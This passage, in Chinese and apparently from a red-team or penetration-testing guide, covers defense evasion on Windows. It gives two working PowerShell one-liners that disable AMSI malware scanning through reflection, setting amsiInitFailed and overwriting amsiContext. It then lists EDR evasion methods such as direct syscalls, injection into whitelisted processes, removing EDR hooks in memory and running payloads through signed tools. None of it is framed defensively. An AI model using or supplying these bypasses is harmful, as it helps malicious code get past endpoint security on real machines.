# 防御绕过技术

### 8.1 AMSI 绕过

**AMSI（Anti-Malware Scan Interface）原理**
- Windows 10+ 引入的恶意代码扫描接口
- 扫描 PowerShell、VBA、JavaScript 等脚本内容

**绕过方法**
```powershell
# 方法1: 反射修改 AMSI DLL
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 方法2: 强制 AMSI 错误
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$mem)
```

### 8.2 EDR 绕过

**常见绕过思路**
- 直接系统调用（Direct Syscalls）
- 进程注入到白名单进程
- 使用 NT API 替代 Win32 API
- 修改内存中的 EDR hook
- 使用未监控的执行方式（如 XSL Script）
- 携带合法签名工具执行 Payload
